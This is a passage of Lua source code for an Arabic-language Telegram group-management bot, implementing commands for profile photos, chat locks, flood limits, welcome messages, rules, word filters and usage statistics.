KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙الايدي معطل  ', 1, 'md')
end end end
tdcli_function ({
ID = "GetUserProfilePhotos",
user_id_ = msg.sender_user_id_,
offset_ = 0,
limit_ = 1 
}, getpro, nil) 
end
getUser(msg.sender_user_id_, KASPER)
end end
--     By Developer KASPER     -- 
 if text == "صورتي" and not KASPERdx1:get(KASPER.."lock:get:photo"..msg.chat_id_)  and KASPER11(msg) then 
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"✟︙لديك "..result.total_count_.." صوره‌‏ ", msg.id_, msg.id_, "md")
else
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا تمتلك صوره في حسابك  ", 1, 'md')
end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
--     By Developer KASPER     -- 
if text and text:match("^صورتي (%d+)$") and KASPER11(msg) then
local pronumb = {string.match(text, "^(صورتي) (%d+)$")}
local function gproen(extra, result, success)
if not is_momod(msg.sender_user_id_, msg.chat_id_) and KASPERdx1:get(KASPER.."lock:get:photo"..msg.chat_id_)  then 
KASPERdx(msg.chat_id_, msg.id_, 1, '️✟︙جلب الصوره الشخصيه معطل ،', 1, 'md')
else
if pronumb[2] == '1' then
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا تمتلك صوره في حسابك  ", 1, 'md')
end
elseif pronumb[2] == '2' then
if result.photos_[1] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[1].sizes_[1].photo_.persistent_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '️✟︙انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
end
elseif pronumb[2] == '3' then
if result.photos_[2] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[2].sizes_[1].photo_.persistent_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '️✟︙انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
end
elseif pronumb[2] == '4' then
if result.photos_[3] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[3].sizes_[1].photo_.persistent_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '️✟︙انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
end
elseif pronumb[2] == '5' then
if result.photos_[4] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[4].sizes_[1].photo_.persistent_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '️✟︙انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
end
elseif pronumb[2] == '6' then
if result.photos_[5] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[5].sizes_[1].photo_.persistent_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '️✟︙انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
end
elseif pronumb[2] == '7' then
if result.photos_[6] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[6].sizes_[1].photo_.persistent_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '️✟︙انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
end
elseif pronumb[2] == '8' then
if result.photos_[7] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[7].sizes_[1].photo_.persistent_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '️✟︙انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
end
elseif pronumb[2] == '9' then
if result.photos_[8] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[8].sizes_[1].photo_.persistent_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '️✟︙انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
end
elseif pronumb[2] == '10' then
if result.photos_[9] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[9].sizes_[1].photo_.persistent_id_)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '️✟︙انت لا تمتلك الصوره التي طلبت رقمها ،', 1, 'md')
end else
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا يمكنني ان ارسل لك اكثر من 10 صور ", 1, 'md')
end end end
tdcli_function ({
ID = "GetUserProfilePhotos",
user_id_ = msg.sender_user_id_,
offset_ = 0,
limit_ = pronumb[2]
}, gproen, nil) 
end
--     By Developer KASPER     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then 
if text and text:match("^قفل (.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local lockptf = {string.match(text, "^(قفل) (.*)$")} 
if lockptf[2] == "التعديل" then
if not KASPERdx1:get(KASPER..'editmsg'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » التعديل  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'editmsg'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل التعديل سابقا ،', 1, 'md')
end end
if lockptf[2] == "الفارسيه" then
if not KASPERdx1:get(KASPER..'farsi'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » الفارسيه  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 53, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'farsi'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل الفارسيه سابقا ،', 1, 'md')
end end
if lockptf[2] == "الفارسيه بالطرد" then
if not KASPERdx1:get(KASPER..'farsiban'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » الفارسيه بالطرد  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 60, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'farsiban'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل الفارسيه بالطرد سابقا ،', 1, 'md')
end end
if lockptf[2] == "الشارحه" then
if not KASPERdx1:get(KASPER..'bot:cmds'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » الشارحه  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:cmds'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل الشارحه سابقا ،', 1, 'md')
end end
if lockptf[2] == "البوتات" then
if not KASPERdx1:get(KASPER..'bot:bots:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » البوتات  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:bots:mute'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل البوتات سابقا ،', 1, 'md')
end end
if lockptf[2] == "البوتات بالطرد" then
if not KASPERdx1:get(KASPER..'bot:bots:ban'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » البوتات بالطرد  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 59, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:bots:ban'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل البوتات بالطرد سابقا ،', 1, 'md')
end end
if lockptf[2] == "البوتات بالتقييد" then
if not KASPERdx1:get(KASPER..'keed_bots'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » البوتات بالتقييد  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 61, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'keed_bots'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل البوتات بالتقييد سابقا ،', 1, 'md')
end end
if lockptf[2] == "التكرار" then
if not KASPERdx1:get(KASPER..'anti-flood:'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » التكرار  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'anti-flood:'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل التكرار سابقا ،', 1, 'md')
end end
if lockptf[2] == "التثبيت" then
if not KASPERdx1:get(KASPER..'bot:pin:mute'..msg.chat_id_) then
local KASPER = '✟︙رتبتك : '..tar..' \n✟︙تم قفل » التثبيت  \n✟︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, KASPER, 52, string.len(msg.sender_user_id_))
KASPERdx1:set(KASPER..'bot:pin:mute'..msg.chat_id_,true)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم قفل التثبيت سابقا ،', 1, 'md')
end end end end
--     By Developer KASPER     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^ضع تكرار (%d+)$") then
local floodmax = {string.match(text, "^(ضع تكرار) (%d+)$")}
if tonumber(floodmax[2]) < 2 then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙قم بتحديد تكرار اكبر من 2 ', 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تحديد التكرار للعدد '..floodmax[2]..' ،', 1, 'md')
KASPERdx1:set(KASPER..'flood:max:'..msg.chat_id_,floodmax[2])
end end 
--     By Developer KASPER     -- 
if text and text:match("^ضع التكرار (.*)$") then
local status = {string.match(text, "^(ضع التكرار) (.*)$")}
if status[2] == "بالطرد" then
if KASPERdx1:get(KASPER..'floodstatus'..msg.chat_id_) == "Kicked" then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم وضع التكرار بالطرد فعلا ،', 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم وضع التكرار بالطرد ،', 1, 'md')
KASPERdx1:set(KASPER..'floodstatus'..msg.chat_id_,'Kicked')
end end
if status[2] == "بالمسح" then
if KASPERdx1:get(KASPER..'floodstatus'..msg.chat_id_) == "DelMsg" then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم وضع التكرار بالمسح فعلا ،', 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم وضع التكرار بالمسح ،', 1, 'md')
KASPERdx1:set(KASPER..'floodstatus'..msg.chat_id_,'DelMsg')
end end end
--     By Developer KASPER     -- 
if text and text:match("^ضع الفارسيه (.*)$") then
local status = {string.match(text, "^(ضع الفارسيه) (.*)$")}
if status[2] == "بالتحذير" then
if KASPERdx1:get(KASPER..'far'..msg.chat_id_) == "thhhh" then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم وضع الفارسيه بالتحذير فعلا ،', 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم وضع الفارسيه بالتحذير ،', 1, 'md')
KASPERdx1:set(KASPER..'far'..msg.chat_id_,'thhhh')
end end
if status[2] == "بدون تحذير" then
if KASPERdx1:get(KASPER..'far'..msg.chat_id_) == "bedthhh" then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم وضع الفارسيه بدون تحذير فعلا ،', 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم وضع الفارسيه بدون تحذير ،', 1, 'md')
KASPERdx1:set(KASPER..'far'..msg.chat_id_,'bedthhh')
end end end
--     By Developer KASPER     -- 
if (text and text == 'تفعيل الايدي بالصوره') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'ضع الايدي بالصوره') and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
if not KASPERdx1:get('KASPER:id:photo'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم وضع الايدي بالصوره فعلا ، ', 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم وضع الايدي بالصوره ، ', 1, 'md')
KASPERdx1:del('KASPER:id:photo'..msg.chat_id_)
end end
if (text and text == 'تعطيل الايدي بالصوره') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'ضع الايدي بدون صوره') and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
if KASPERdx1:get('KASPER:id:photo'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم وضع الايدي بدون صوره فعلا ، ', 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم وضع الايدي بدون صوره ، ', 1, 'md')
KASPERdx1:set('KASPER:id:photo'..msg.chat_id_,true)
 end end
 --     By Developer KASPER     -- 
if (text and text == 'تفعيل الايدي') and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
if not KASPERdx1:get('KASPER:id:mute'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تفعيل الايدي سابقا ، ', 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تفعيل الايدي ، ', 1, 'md')
KASPERdx1:del('KASPER:id:mute'..msg.chat_id_)
 end end
if (text and text == 'تعطيل الايدي') and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
if KASPERdx1:get('KASPER:id:mute'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تعطيل الايدي سابقا ، ', 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تعطيل الايدي ، ', 1, 'md')
KASPERdx1:set('KASPER:id:mute'..msg.chat_id_,true)
 end end
 if (text and text == 'تفعيل اللعبه') and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) or (text and text == 'تفعيل الالعاب') and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
if not KASPERdx1:get(KASPER..'bot:lock_geam'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تفعيل الالعاب سابقا ، ', 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1,[[*
✟︙اهلا بك في قائمه الالعاب ↓↓
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙الالعاب المتوفره بالبوت ↓↓
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙ارسل امر { تخمين } لبدء لعبه
✟︙ارسل امر { كت تويت } لبدء لعبه
✟︙ارسل امر { ترتيب } لبدء لعبه 
✟︙ارسل امر { سمايلات } لبدء لعبه 
✟︙ارسل امر { حزوره } لبدء لعبه 
✟︙ارسل امر { المعاني } لبدء لعبه 
✟︙ارسل امر { العكس } لبدء لعبه 
✟︙ارسل امر { المحيبس } لبدء لعبه 
✟︙ارسل امر { امثله } لبدء لعبه 
✟︙ارسل امر { المختلف } لبدء لعبه 
✟︙ارسل امر { انكليزي } لبدء لعبه 
✟︙ارسل امر { رياضيات } لبدء لعبه 
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙قناة السورس *[@KASPER_ch] 
]], 1, 'md')
KASPERdx1:del(KASPER..'bot:lock_geam'..msg.chat_id_)
 end end
if (text and text == 'تعطيل اللعبه') and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) or (text and text == 'تعطيل الالعاب') and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
if KASPERdx1:get(KASPER..'bot:lock_geam'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تعطيل الالعاب سابقا ، ', 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تعطيل الالعاب ، ', 1, 'md')
KASPERdx1:set(KASPER..'bot:lock_geam'..msg.chat_id_,true)
 end end
 
 
 if (text and text == 'تفعيل تاك الكل') and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
if not KASPERdx1:get(KASPER..'bot:lock_tag'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تفعيل تاك الكل سابقا ، ', 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تفعيل تاك الكل ، ', 1, 'md')
KASPERdx1:del(KASPER..'bot:lock_tag'..msg.chat_id_)
 end end
if (text and text == 'تعطيل تاك الكل') and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
if KASPERdx1:get(KASPER..'bot:lock_tag'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تعطيل تاك الكل سابقا ، ', 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تعطيل تاك الكل ، ', 1, 'md')
KASPERdx1:set(KASPER..'bot:lock_tag'..msg.chat_id_,true)
 end end
--     By Developer KASPER     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text == 'ضع رابط' or text == 'وضع رابط' or text == 'ضع الرابط' or text == 'وضع الرابط' then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙ارسل رابط المجموعه ليتم حفظه ، ', 1, 'md')
KASPERdx1:setex(KASPER.."bot:setgroup:link"..msg.chat_id_..""..msg.sender_user_id_,300,true) 
end
--     By Developer KASPER     -- 
if text == "الدعم" or text == "المطور" and KASPER11(msg) then
local link = KASPERdx1:get(KASPER.."bot:supports:link")
if link then
if link:match("https://") then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم ارسال بياناتك للمطور \n✟︙يمكنك طلب المساعدة من كروب الدعم \n✟︙رابط كروب دعم البوت \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n " .. link, 1, "html")
else
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم ارسال بياناتك للمطور \n✟︙يمكنك طلب المساعدة من بوت التواصل \n✟︙معرف بوت تواصل المطور \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n @" .. link, 1, "html")
end end end
--     By Developer KASPER     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^تفعيل الترحيب$") and KASPER11(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تفعيل الترحيب ، ', 1, 'md')
KASPERdx1:set(KASPER.."bot:welcome"..msg.chat_id_,true)
end
if text and text:match("^تعطيل الترحيب$") and KASPER11(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تعطيل الترحيب ، ', 1, 'md')
KASPERdx1:del(KASPER.."bot:welcome"..msg.chat_id_)
end
if KASPERdx1:get(KASPER..'add:welcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم الغاء حفظ الترحيب ،", 1, "md")
KASPERdx1:del(KASPER..'add:welcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
KASPERdx1:del(KASPER..'add:welcome'..msg.chat_id_..':'..msg.sender_user_id_)
KASPERdx1:set(KASPER..'get:welcome'..msg.chat_id_,text)
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم حفظ الترحيب ،\n", 1, "md")
return false   
end
if text and text:match("^ضع ترحيب$") and KASPER11(msg) or text and text:match("^وضع ترحيب$") and KASPER11(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙ارسل لي الترحيب الان :\n✟︙يمكن اضافه للترحيب ما يلي :\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n- `name` ~ داله عرض الاسم\n- `@user` ~ داله عرض المعرف\n✟︙فقط اضغط على الداله سيتم نسخها\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n✟︙للخروج ارسل  ( الغاء )\n ', 1, 'md')
KASPERdx1:set(KASPER..'add:welcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^حذف الترحيب$") and KASPER11(msg) or text and text:match("^مسح الترحيب$") and KASPER11(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم حذف الترحيب ، ', 1, 'md')
KASPERdx1:del(KASPER..'get:welcome'..msg.chat_id_)
end
if text and text:match("^جلب الترحيب$") and KASPER11(msg) or text and text:match("^الترحيب$") and KASPER11(msg) then
local wel = KASPERdx1:get(KASPER..'get:welcome'..msg.chat_id_)
if wel then
KASPERdx(msg.chat_id_, msg.id_, 1, wel, 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لم يتم وضع الترحيب ، ', 1, 'md')
end end end
--     By Developer KASPER     -- 
if KASPERdx1:get(KASPER..'bot:addrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم الغاء حفظ القوانين ', 1, 'md')
KASPERdx1:del(KASPER..'bot:addrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
KASPERdx1:del(KASPER..'bot:addrules'..msg.chat_id_..':'..msg.sender_user_id_)
KASPERdx1:set(KASPER..'bot:rules'..msg.chat_id_,text)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم حفظ القوانين ', 1, 'md')
return false   
end
if text and text:match("^ضع قوانين$") and KASPER11(msg) or text and text:match("^وضع قوانين$") and KASPER11(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙ارسل لي القوانين الان ،\n✟︙للرجوع ارسل { الغاء } ', 1, 'md')
KASPERdx1:set(KASPER..'bot:addrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if KASPERdx1:get(KASPER..'SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'الغاء' then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم الغاء حفظ الوصف ', 1, 'md')
KASPERdx1:del(KASPER..'SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
KASPERdx1:del(KASPER..'SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
https.request('https://api.telegram.org/bot'..tokenbot..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم حفظ الوصف ، ', 1, 'md')
return false  
end
if text and text:match("^ضع وصف$") and KASPER11(msg) or text and text:match("^وضع وصف$") and KASPER11(msg) then  
KASPERdx1:set(KASPER..'SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙ارسل لي الوصف الان ،\n✟︙للرجوع ارسل { الغاء } ', 1, 'md')
end
--     By Developer KASPER     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^منع (.*)$") then
local filters = {string.match(text, "^([Ff]ilter) (.*)$")}
local filterss = {string.match(text, "^(منع) (.*)$")}
local name = string.sub(filters[2] or filterss[2], 1, 50)
local hash = (KASPER..'bot:filters:'..msg.chat_id_)
KASPERdx1:hset(hash, name,'newword')
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙الكلمه ( "..name.." )\n✟︙تم منعها ،", 1, 'md')
end end
--     By Developer KASPER     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^الغاء منع (.*)$") then
local rws = {string.match(text, "^([Uu]nfilter) (.*)$")}
local rwss = {string.match(text, "^(الغاء منع) (.*)$")}
local name = string.sub(rws[2] or rwss[2], 1, 50)
local cti = msg.chat_id_
local hash = (KASPER..'bot:filters:'..msg.chat_id_)
if not KASPERdx1:hget(KASPER..hash, name) then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙الكلمه ( "..name.." )\n✟︙هي غير ممنوعه في المجموعه ،", 1, 'md')
else
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙الكلمه ( "..name.." )\n✟︙تم الغاء منعها ،", 1, 'md')
KASPERdx1:hdel(hash, name)
end end end
--     By Developer KASPER     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^فلتر عام (.*)$") then
local filterss = {string.match(text, "^(فلتر عام) (.*)$")}
local name = string.sub(filterss[2], 1, 50)
local hash = (KASPER..'bot:freewords:')
KASPERdx1:hset(hash, name,'newword')
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙الكلمه ( "..name.." )\n✟︙تم منعها عام ،", 1, 'md')
end end
--     By Developer KASPER     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^الغاء منع عام (.*)$") then
local rwss = {string.match(text, "^(الغاء منع عام) (.*)$")}
local name = string.sub(rwss[2], 1, 50)
local cti = msg.chat_id_
local hash = (KASPER..'bot:freewords:')
if not KASPERdx1:hget(hash, name)then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙الكلمه ( "..name.." )\n✟︙هي ليست ممنوعه عام ،", 1, 'html')
else
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙الكلمه ( "..name.." )\n✟︙تم منعها عام ،", 1, 'html')
KASPERdx1:hdel(hash, name)
end end end
--     By Developer KASPER     -- 
if text and text:match("^الاحصائيات$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
local gps = KASPERdx1:scard(KASPER.."bot:groups")
local users = KASPERdx1:scard(KASPER.."bot:userss")
local allmgs = KASPERdx1:get(KASPER.."bot:allmsgs")
if KASPERdx1:get(KASPER..'autoleave') == "On" then
autoleavear = "مفعل 🌟"
elseif KASPERdx1:get(KASPER..'autoleave') == "Off" then
autoleavear = "معطل 🛢"
elseif not KASPERdx1:get(KASPER..'autoleave') then
autoleavear = "معطل 🛢"
end
if KASPERdx1:get(KASPER..'clerk') == "On" then
clerkar = "مفعل 🌟"
elseif KASPERdx1:get(KASPER..'clerk') == "Off" then
clerkar = "مفعل 🛢"
elseif not KASPERdx1:get(KASPER..'clerk') then
clerkar = "مفعل 🌟"
end
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙احصائيات البوت ، \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •~~\n✟︙عدد الكروبات ، '..gps..'\n✟︙عدد الاعضاء ، '..users..' \n✟︙عدد كل رسائل المجموعات ، '..allmgs..'\n✟︙المغادره التلقائيه ، '..autoleavear..'\n✟︙رساله ستارت ، '..clerkar, 1, 'md')
end 
--     By Developer KASPER     -- 
if text == "تنظيف الكروبات" and is_sudo(msg) then 
local group = KASPERdx1:smembers(KASPER.."bot:groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
print('\27[30;34m»» THE BOT IS NOT ADMIN ↓\n»» '..group[i]..'\n\27[1;37m')
KASPERdx1:srem(KASPER.."bot:groups",group[i]) 
changeChatMemberStatus(group[i], bot_id, "Left")
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
KASPERdx1:srem( KASPER.."bot:groups",group[i]) 
q = q + 1
print('\27[30;35m»» THE BOT IS LEFT GROUP ↓\n»» '..group[i]..'\n\27[1;37m')
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
KASPERdx1:srem( KASPER.."bot:groups",group[i]) 
q = q + 1
print('\27[30;36m»» THE BOT IS KICKED GROUP ↓\n»» '..group[i]..'\n\27[1;37m')
end
if data and data.code_ and data.code_ == 400 then
KASPERdx1:srem( KASPER.."bot:groups",group[i]) 
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
KASPERdx(msg.chat_id_, msg.id_, 1,'✟︙لا يوجد كروبات وهميه ،\n', 1, 'md')
else
local KASPERddx2 = (w + q)
local KASPERdx3 = #group - KASPERddx2
if q == 0 then
KASPERddx2 = ''
else
